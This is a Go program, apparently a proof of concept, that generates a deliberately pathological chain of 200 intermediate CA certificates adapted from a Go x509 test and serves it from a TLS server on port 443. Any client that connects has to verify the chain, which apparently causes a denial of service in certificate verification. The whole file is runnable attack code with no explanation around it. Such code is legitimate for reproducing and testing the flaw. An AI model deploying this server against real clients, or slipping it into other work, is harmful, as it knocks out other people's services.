package main

import (
	"crypto"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"log"
	"math/big"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {
	privPem, chainPem := makePathologicalChain()

	keyF, err := ioutil.TempFile("", "key")
	if err != nil {
		log.Fatal(err)
	}
	if _, err := fmt.Fprint(keyF, privPem); err != nil {
		log.Fatal(err)
	}
	defer keyF.Close()
	defer os.Remove(keyF.Name())

	chainF, err := ioutil.TempFile("", "key")
	if err != nil {
		log.Fatal(err)
	}
	if _, err := fmt.Fprint(chainF, chainPem); err != nil {
		log.Fatal(err)
	}
	defer chainF.Close()
	defer os.Remove(chainF.Name())

	if err := http.ListenAndServeTLS(":443", chainF.Name(), keyF.Name(), nil); err != nil {
		log.Fatal(err)
	}
}

// Adapted from Go 1.11.3 crypto/x509/verify_test.go:TestPathologicalChain
// Returns (privkeyPem, fullchainPem)
func makePathologicalChain() (string, string) {
	root, rootKey, err := generateCert("R", true, nil, nil)
	if err != nil {
		log.Fatal(err)
	}

	fullchainReverse := []string{}

	fullchainReverse = append(fullchainReverse, pemEncode(root.Raw, "CERTIFICATE"))

	for i := 0; i < 200; i++ {
		root, rootKey, err = generateCert("I", true, root, rootKey)
		if err != nil {
			log.Fatal(err)
		}
		fullchainReverse = append(fullchainReverse, pemEncode(root.Raw, "CERTIFICATE"))
	}

	leaf, leafKey, err := generateCert("L", false, root, rootKey)
	if err != nil {
		log.Fatal(err)
	}
	fullchainReverse = append(fullchainReverse, pemEncode(leaf.Raw, "CERTIFICATE"))

	for i, j := 0, len(fullchainReverse)-1; i < j; i, j = i+1, j-1 {
		fullchainReverse[i], fullchainReverse[j] = fullchainReverse[j], fullchainReverse[i]
	}

	leafKeyDer, err := x509.MarshalECPrivateKey(leafKey)
	if err != nil {
		log.Fatal(err)
	}

	return pemEncode(leafKeyDer, "EC PRIVATE KEY"), strings.Join(fullchainReverse, "")
}

// Copied from Go 1.11.3 crypto/x509/verify_test.go
func generateCert(cn string, isCA bool, issuer *x509.Certificate, issuerKey crypto.PrivateKey) (*x509.Certificate, *ecdsa.PrivateKey, error) {
	priv, err := ecdsa.GenerateKey(elliptic.P224(), rand.Reader)
	if err != nil {
		return nil, nil, err
	}

	serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
	serialNumber, _ := rand.Int(rand.Reader, serialNumberLimit)

	template := &x509.Certificate{
		SerialNumber: serialNumber,
		Subject:      pkix.Name{CommonName: cn},
		NotBefore:    time.Now().Add(-1 * time.Hour),
		NotAfter:     time.Now().Add(24 * time.Hour),

		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		IsCA:                  isCA,
	}
	if issuer == nil {
		issuer = template
		issuerKey = priv
	}

	derBytes, err := x509.CreateCertificate(rand.Reader, template, issuer, priv.Public(), issuerKey)
	if err != nil {
		return nil, nil, err
	}
	cert, err := x509.ParseCertificate(derBytes)
	if err != nil {
		return nil, nil, err
	}

	return cert, priv, nil
}

func pemEncode(data []byte, t string) string {
	return string(pem.EncodeToMemory(&pem.Block{
		Type:  t,
		Bytes: data,
	}))
}
